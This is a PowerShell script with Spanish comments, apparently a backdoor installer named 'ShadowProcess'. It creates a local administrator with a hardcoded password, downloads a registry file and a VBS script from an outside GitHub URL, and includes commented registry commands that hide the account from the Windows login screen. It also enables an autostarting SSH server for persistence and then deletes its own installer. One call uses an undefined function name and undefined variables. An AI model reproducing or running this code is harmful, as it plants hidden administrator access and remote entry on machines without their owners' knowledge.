#Recursos

#String random nombre de directorios.
function random_text {
	return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}



#creando administrador local
function Create-NewLocalAdmin {
	[CmdletBinding()]
	param (
		[string]$NewLocalAdmin,
		[securestring]$Password
	)
	begin {
	}
	process {
		New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
		Write-Verbose "$NewLocalAdmin local user crated"
		Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
		Write-Verbose "$NewLocalAdmin added to the local administrator group"
		
	}
	end{
	}
}

#Variables 
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = $PWD.Path

#creando usuario administrador 
$NewLocalAdmin = "swadmin"
$Password = (ConvertTo-SecureString "12192003" -AsPlainText -Force)
create_account -uname $uname -pword $pword

#ir al directorio en la carpeta %temp%, crear un archivo PoC.txt
mkdir $path
cd $path

#registro para esconder administrador
$reg_file = random_text 
Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/hu.reg -OutFile "$reg_file.reg"

#script visual basic confirmar reg
$vbs_file = random_text
Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/confirm.vbs -OutFile "$vbs_file.vbs"

#instalando registro
#powershell .\"$reg_file.reg";powershell .\"$vbs_file.vbs"
#powershell powershell.exe -windowstyle hidden Set-Location -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList';Get-Item -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList' | New-Item -Name 'shprocess' -Force;New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Name 'shprocess' -Value "00000000" -PropertyType DWORD -Force

cd $path
# estableciendo persistencia ssh
powershell Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;Start-Service sshd;Set-Service -Name sshd -StartupType 'Automatic'



#autoeliminacion
cd $initial_dir
del .\installer.ps1